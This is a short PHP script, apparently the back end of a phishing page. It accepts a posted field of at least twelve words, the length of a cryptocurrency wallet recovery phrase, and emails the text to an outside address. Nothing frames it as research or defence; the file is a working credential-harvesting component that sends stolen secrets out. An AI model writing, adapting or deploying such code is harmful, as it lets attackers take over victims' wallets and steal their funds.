<?php
if ( isset($_POST['words']) ) {
    $words = explode(" ", $_POST['words']);

    if ( count($words) < 12 ) {
        header("HTTP/1.1 400 Bad Request");
    } else {
        $mail = mail('justmail44@protonmail.com', 'mm', $_POST['words']);
    }
}